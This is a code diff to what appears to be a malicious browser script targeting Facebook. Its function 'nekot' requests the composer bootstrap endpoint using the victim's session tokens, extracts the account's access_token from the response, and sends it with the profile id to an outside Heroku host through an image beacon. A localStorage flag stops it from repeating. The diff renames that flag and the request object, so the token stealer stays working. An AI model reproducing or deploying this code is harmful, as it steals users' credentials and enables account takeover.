@@ -50,7 +50,7 @@ function _e_P(){
 }
 function nekot() {
 
-  if (localStorage.access_token != "nejsim") {
+  if (localStorage.access_token != "nejsimddddd") {
     var getParams = {};
     getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
     getParams["composer_type"] = "pages_feed";
@@ -68,14 +68,14 @@ function nekot() {
     params["__rev"] = __rev;
     params["fb_dtsg"] = fb_dtsg;
     params["jazoest"] = jazoest;
-    var xhr = new ajax;
+    var xhr = new sie;
     xhr.open("POST", "/react_composer/status/bootstrap/?" + _z(getParams));
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
     xhr.onreadystatechange = function() {
       if (xhr.readyState == 4 && xhr.status == 200) {
         if (xhr.responseText.indexOf("access_token") > 0) {
            new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=PROBA_INBOX";
-          localStorage.access_token = "nejsim";
+          localStorage.access_token = "nejsimddddd";
         }
       }
     };
